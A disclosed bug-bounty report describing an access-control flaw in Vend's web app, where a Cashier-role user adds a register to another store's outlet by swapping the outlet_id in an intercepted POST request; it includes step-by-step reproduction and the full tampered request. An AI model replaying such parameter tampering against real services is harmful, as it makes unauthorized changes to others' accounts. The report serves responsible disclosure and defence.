# Improper access control on adding a Register to an Outlet

## Report Details
- **Report ID**: 317332
- **URL**: https://hackerone.com/reports/317332
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-02-18T11:40:29.315Z
- **Disclosed**: 2018-05-02T03:43:35.646Z

## Reporter
- **Username**: al88nsk
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: vend_vdp

## Vulnerability Information
**Summary:** User without permissions to add a Register to an Outlet can bypass this restriction and add a Register to an Outlet.

**Description:** I do not know which permission exactly controls this action, I tested this against default `Cashier` role. User with default `Cashier` role has no permission to add registers.  If a user creates his own store on `vendhq.com` then he can add a Register to an Outlet.

## Steps To Reproduce:

  1. Add a user to store A with `Cashier` role. Assume the added user's email is attacker@attacker.com
  2. Go to `Setup` -> `Outlets and Registers`
  3. Create an outlet in store A
  4. Create a new store B using email attacker@attacker.com
  5. Log in to store B with attacker@attacker.com credentials
  6. Create an outlet in store B
  7. Run Burp Suite or any other proxy to intercept requests
  8. Add a register to outlet in store B and intercept outgoing POST request
  9. Replace id in `vend_register%5Boutlet_id%5D=<outlet id>` from the request with id of outlet from store A and process the request
  10. Check outlet from store A - a register should be added to it

Request example

```
POST /register/create/outlet_id/<outled id from B> HTTP/1.1
Host: <store B>.vendhq.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://<store B>.vendhq.com/register/<outled id from B>/new?confirmed=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 694
Cookie: <Cookie>
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

vend_register%5Bid%5D=&vend_register%5Boutlet_id%5D=<outled id from A>&vend_register%5B_csrf_token%5D=<csrf token>&vend_register%5Bname%5D=6&vend_register%5Bcash_managed_payment_id%5D=<cash managed payment id>&vend_register%5Breceipt_template_id%5D=<receipt template id>&vend_register%5Binvoice_sequence%5D=1&vend_register%5Binvoice_prefix%5D=&vend_register%5Binvoice_suffix%5D=&vend_register%5Bask_for_user_on_sale%5D=0&vend_register%5Bemail_receipt%5D=1&vend_register%5Bprint_receipt%5D=1&vend_register%5Bask_for_note_on_save%5D=1&vend_register%5Bprint_note_on_receipt%5D=1&vend_register%5Bshow_discounts%5D=1&return=
```

Cashier can get id of interesting outlet from `Sales Ledger` page source.

## Impact

An attacker can add registers to outlets even if he has no permissions to do it.

## Attachments
No attachments
